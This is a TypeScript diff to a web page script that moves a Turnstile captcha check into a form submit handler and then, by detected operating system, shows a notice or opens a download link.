@@ -6,11 +6,8 @@ declare global {
 	}
 }
 
-const button = document.getElementById('meeting-btn') as HTMLButtonElement
-//const textGood = document.getElementById('hidden-text-good') as HTMLParagraphElement
 const textPhone = document.getElementById('hidden-text-phone') as HTMLParagraphElement
 const textLinux = document.getElementById('hidden-text-linux') as HTMLParagraphElement
-//const tos = document.getElementById('tos') as HTMLHeadingElement
 const updateLink = document.getElementById('update-link') as HTMLAnchorElement
 const asideDownload = document.getElementById('aside-download') as HTMLAnchorElement
 const asideUpdate = document.getElementById('aside-update') as HTMLAnchorElement
@@ -20,24 +17,6 @@ const protectedForm = document.getElementById('protected-form') as HTMLFormEleme
 const osCategory: string = getOSCategory()
 
 const downloadLink = updateLinks(osCategory)
-
-button.addEventListener('click', () => {
-
-	const token = window.turnstile.getResponse();
-
-	if (!token) {
-		return;
-	}
-
-	if (osCategory != 'Windows' && osCategory != 'macOS < 15' && osCategory != 'macOS >= 15' && osCategory != "Linux") {
-		textPhone.style.display = 'block'
-	} else if (osCategory == "Linux") {
-		textLinux.style.display = 'block'
-	} else {
-		window.open(downloadLink, '_blank')
-		//textGood.style.display = 'block'
-	}
-})
 
 function updateLinks(osCategory: string): string {
 	let link = ''
@@ -94,6 +73,15 @@ function getOSCategory() {
 protectedForm.addEventListener("submit", async function(e) {
 	e.preventDefault();
 
+	const token = window.turnstile.getResponse();
+
+	if (!token) {
+		captchaText.style.display = "block"
+		return
+	}
+
+	captchaText.style.display = "none"
+
 	const form = e.target as HTMLFormElement;
 	const formData = new FormData(form);
 
@@ -104,7 +92,13 @@ protectedForm.addEventListener("submit", async function(e) {
 
 	const result = await response.json();
 
-	if (!result.success) {
-		captchaText.style.display = "block"
+	if (result.success) {
+		if (osCategory != 'Windows' && osCategory != 'macOS < 15' && osCategory != 'macOS >= 15' && osCategory != "Linux") {
+			textPhone.style.display = 'block'
+		} else if (osCategory == "Linux") {
+			textLinux.style.display = 'block'
+		} else {
+			window.open(downloadLink, '_blank')
+		}
 	}
 })
